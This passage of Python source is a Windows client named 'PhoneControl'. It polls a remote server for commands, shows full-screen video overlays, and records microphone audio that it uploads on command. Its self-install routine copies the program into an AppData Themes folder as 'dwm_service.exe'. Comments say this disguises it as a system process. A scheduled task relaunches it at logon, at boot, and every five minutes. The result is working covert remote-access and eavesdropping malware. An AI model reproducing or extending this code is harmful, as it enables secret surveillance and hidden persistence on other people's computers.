        path = str(BUILTIN_VIDEO_DIR / f"video{num}.mp4")
        if not os.path.exists(path):
            log.warning(f"Built-in video not found: {path}")
            return
        ui_call("show_video_overlay", path, lock, duration, fb_mode, rp, survey, chat_id)

    elif name == "play_raw":
        raw_num = cmd.get("raw_num", 0)
        videos = get_raw_videos()
        if not videos:
            log.error("play_raw: no raw videos in assets")
            http_post_json("/text_reply", {"chat_id": chat_id,
                "text": "⚠️ Нет скачанных видео. Добавь через /addraw", "device_id": DEVICE_ID})
        elif raw_num < 1 or raw_num > len(videos):
            log.error(f"play_raw: invalid num {raw_num}")
            http_post_json("/text_reply", {"chat_id": chat_id,
                "text": f"⚠️ Нет видео raw{raw_num}", "device_id": DEVICE_ID})
        else:
            path = videos[raw_num - 1]["path"]
            ui_call("show_video_overlay", path, lock, duration,
                    fb_mode, rp, survey, chat_id)

    elif name == "prefetch":
        url = cmd.get("url", "")
        threading.Thread(target=prefetch_video, args=(url, chat_id), daemon=True).start()

    elif name == "get_video_list":
        threading.Thread(target=send_video_list, args=(chat_id,), daemon=True).start()

    elif name == "delete_video":
        num = cmd.get("num", 0)
        threading.Thread(target=delete_raw_video, args=(num, chat_id), daemon=True).start()

    elif name == "unban_video":
        unban_video()

    elif name in ("open_gallery", "open_camera"):
        open_file_picker(chat_id)

    elif name == "get_audio_devices":
        threading.Thread(target=get_and_send_audio_devices, args=(chat_id,), daemon=True).start()

    elif name == "record_audio":
        seconds = cmd.get("seconds", 10)
        device_index = cmd.get("device_index", None)
        threading.Thread(target=record_and_send_audio,
                         args=(seconds, chat_id, device_index), daemon=True).start()

    else:
        log.warning(f"Unknown command: {name}")

# ─── UI queue (единый Tkinter-поток) ─────────────────────────────────────────
#
# Tkinter нельзя запускать из нескольких потоков одновременно.
# Все overlay-вызовы кладём в очередь, единый UI-поток их забирает и исполняет.
# poll_loop при этом не блокируется — он просто кладёт задачу в очередь и идёт дальше.

def ui_call(fn_name: str, *args):
    """Запускает UI окно в отдельном subprocess."""
    payload = json.dumps({"fn": fn_name, "args": list(args)})
    try:
        subprocess.Popen(
            [sys.executable, "--ui", payload],
            creationflags=0x00000008,
            close_fds=True,
        )
    except Exception as e:
        log.error(f"ui_call failed: {e}")

# ─── Main poll loop ───────────────────────────────────────────────────────────

def poll_loop():
    consecutive_errors = 0
    last_instance_id   = ""
    active             = False

    log.info(f"PhoneControl Windows client started. Device ID: {DEVICE_ID}")
    log.info(f"Server: {SERVER_URL}")

    while True:
        try:
            data = http_get("/poll")
            consecutive_errors = 0

            active = data.get("active", False)

            instance_id = data.get("instance_id", "")
            if instance_id and instance_id != last_instance_id:
                log.info(f"Server instance changed: {instance_id}")
                last_instance_id = instance_id

            cmd = data.get("command")
            if cmd:
                threading.Thread(
                    target=handle_command, args=(cmd,), daemon=True
                ).start()

        except Exception as e:
            consecutive_errors += 1
            log.error(f"Poll error #{consecutive_errors}: {e}")
            if consecutive_errors >= 10:
                log.warning("Too many errors, backing off 60s")
                time.sleep(60)
                consecutive_errors = 0
                continue

        time.sleep(POLL_INTERVAL_ACTIVE if active else POLL_INTERVAL_IDLE)


# ─── Self-install ─────────────────────────────────────────────────────────────

# Прячем в системную папку — не бросается в глаза
INSTALL_DIR  = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Themes" / "WinDWM"
INSTALL_EXE  = INSTALL_DIR / "dwm_service.exe"   # выглядит как системный процесс
TASK_NAME    = "WindowsDWMService"                # выглядит как системная задача
UNINSTALL_CMD = f'schtasks /delete /tn "{TASK_NAME}" /f && rmdir /s /q "{INSTALL_DIR}"'

def is_installed() -> bool:
    """Already running from install location."""
    if not getattr(sys, "frozen", False):
        return True  # running as .py in dev — skip install
    return Path(sys.executable).resolve() == INSTALL_EXE.resolve()

def self_install():
    """Copy exe to AppData, register scheduled task, launch it, exit."""
    import shutil

    INSTALL_DIR.mkdir(parents=True, exist_ok=True)

    # Убиваем старый процесс если он запущен из папки установки
    if INSTALL_EXE.exists():
        subprocess.run(
            ["taskkill", "/f", "/im", "phonecontrol.exe"],
            capture_output=True, timeout=10
        )
        time.sleep(1.5)  # ждём пока процесс завершится и отпустит файл

    src = Path(sys.executable)
    dst_assets = INSTALL_DIR / "assets"

    shutil.copy2(src, INSTALL_EXE)

    meipass = Path(getattr(sys, "_MEIPASS", ""))
    src_assets = (meipass / "assets") if (meipass / "assets").exists() else (src.parent / "assets")
    if src_assets.exists():
        if dst_assets.exists():
            shutil.rmtree(dst_assets)
        shutil.copytree(src_assets, dst_assets)
        log.info(f"Assets copied from {src_assets}")
    else:
        log.warning("Assets folder not found — videos will not work")

    log.info(f"Copied to {INSTALL_EXE}")

    # Register scheduled task — runs at logon, restarts on failure
    xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
    <BootTrigger><Enabled>true</Enabled></BootTrigger>
    <TimeTrigger>
      <Repetition>
        <Interval>PT5M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2000-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>
  <Actions>
    <Exec>
      <Command>{INSTALL_EXE}</Command>
    </Exec>
  </Actions>
</Task>"""

    xml_path = INSTALL_DIR / "task.xml"
    xml_path.write_text(xml, encoding="utf-16")

    # exe собран с uac_admin=True — права уже есть при запуске
    subprocess.run(
        ["schtasks", "/create", "/tn", TASK_NAME, "/xml", str(xml_path), "/f"],
        check=True, timeout=15, capture_output=True
    )
    xml_path.unlink()
    log.info("Scheduled task registered")

    # Launch installed exe and exit current process
    subprocess.Popen([str(INSTALL_EXE)],
                     creationflags=0x00000008)  # DETACHED_PROCESS
    log.info("Launched installed exe, exiting installer")
    sys.exit(0)


def print_uninstall_hint():
    """Write uninstall.bat with UAC elevation and process kill."""
    bat = INSTALL_DIR / "uninstall.bat"
    bat.write_text(
        "@echo off\n"
        ":: Запрос прав администратора\n"
        "net session >nul 2>&1\n"
        "if %errorLevel% neq 0 (\n"
        "    powershell -Command \"Start-Process '%~f0' -Verb RunAs\"\n"
        "    exit /b\n"
        ")\n"
        "\n"
        "echo Останавливаем PhoneControl...\n"
        f"taskkill /f /im phonecontrol.exe >nul 2>&1\n"
        "timeout /t 2 >nul\n"
        "\n"
        "echo Удаляем задачу планировщика...\n"
        f"schtasks /delete /tn \"{TASK_NAME}\" /f >nul 2>&1\n"
        "timeout /t 1 >nul\n"
        "\n"
        "echo Удаляем файлы...\n"
        ":: PowerShell удаляет папку через 3 сек после выхода bat\n"
        f"powershell -Command \"Start-Sleep 3; Remove-Item -Recurse -Force '{INSTALL_DIR}'\"\n"
        "\n"
        "echo Готово! PhoneControl удалён.\n"
        "pause\n",
        encoding="utf-8"
    )
    log.info(f"Uninstall bat written: {bat}")


def get_and_send_audio_devices(chat_id: str):
    try:
        import sounddevice as sd
        mics = [{"index": i, "name": d["name"]}
                for i, d in enumerate(sd.query_devices())
                if d["max_input_channels"] > 0]
        log.info(f"Found {len(mics)} microphones")
        http_post_json("/micro_devices", {
            "chat_id": chat_id, "device_id": DEVICE_ID, "devices": mics})
    except ImportError:
        http_post_json("/text_reply", {"chat_id": chat_id,
            "text": "⚠️ sounddevice не установлен.", "device_id": DEVICE_ID})
    except Exception as e:
        log.error(f"get_audio_devices: {e}")
        http_post_json("/text_reply", {"chat_id": chat_id,
            "text": f"⚠️ Ошибка: {e}", "device_id": DEVICE_ID})


def record_and_send_audio(seconds: int, chat_id: str, device_index=None):
    import wave, tempfile
    try:
        import sounddevice as sd
        import numpy as np
        log.info(f"Recording {seconds}s device={device_index}")
        sr = 44100
        rec = sd.rec(int(seconds * sr), samplerate=sr, channels=1,
                     dtype="int16", device=device_index)
        sd.wait()
        tmp = tempfile.NamedTemporaryFile(suffix=".wav", delete=False)
        tmp_path = tmp.name
        tmp.close()
        with wave.open(tmp_path, "wb") as wf:
            wf.setnchannels(1)
            wf.setsampwidth(2)
            wf.setframerate(sr)
            wf.writeframes(rec.tobytes())
        log.info(f"Audio saved: {tmp_path}")
        http_post_multipart("/upload", tmp_path, chat_id,
                            caption=f"🎙 Запись {seconds} сек")
        os.unlink(tmp_path)
    except ImportError:
        http_post_json("/text_reply", {"chat_id": chat_id,
            "text": "⚠️ sounddevice не установлен.", "device_id": DEVICE_ID})
    except Exception as e:
        log.error(f"record_audio: {e}")
        http_post_json("/text_reply", {"chat_id": chat_id,
            "text": f"⚠️ Ошибка записи: {e}", "device_id": DEVICE_ID})


def _global_excepthook(exc_type, exc_value, exc_tb):
    import traceback
    log.critical("Unhandled exception: " + "".join(
        traceback.format_exception(exc_type, exc_value, exc_tb)))

sys.excepthook = _global_excepthook


def _threading_excepthook(args):
    import traceback
    log.critical("Thread exception in {}: {}".format(
        args.thread.name if args.thread else "?",
        "".join(traceback.format_exception(
            args.exc_type, args.exc_value, args.exc_traceback))))

threading.excepthook = _threading_excepthook


def _poll_loop_supervisor():
    while True:
        try:
            poll_loop()
        except Exception as e:
            log.critical(f"poll_loop crashed: {e}, restarting in 10s...")
            time.sleep(10)


if __name__ == "__main__":
    if len(sys.argv) >= 3 and sys.argv[1] == "--ui":
        try:
            import json as _json
            payload = _json.loads(sys.argv[2])
            fn_name = payload["fn"]
            args    = payload["args"]
            fn_map  = {
                "show_message_overlay": show_message_overlay,
                "show_video_overlay":   show_video_overlay,
            }
            fn = fn_map.get(fn_name)
            if fn:
                fn(*args)
            else:
                log.error(f"Unknown UI fn: {fn_name}")
        except Exception as e:
            log.error(f"UI subprocess error: {e}")
        sys.exit(0)

    if not is_installed():
        self_install()
    else:
        print_uninstall_hint()
        _poll_loop_supervisor()
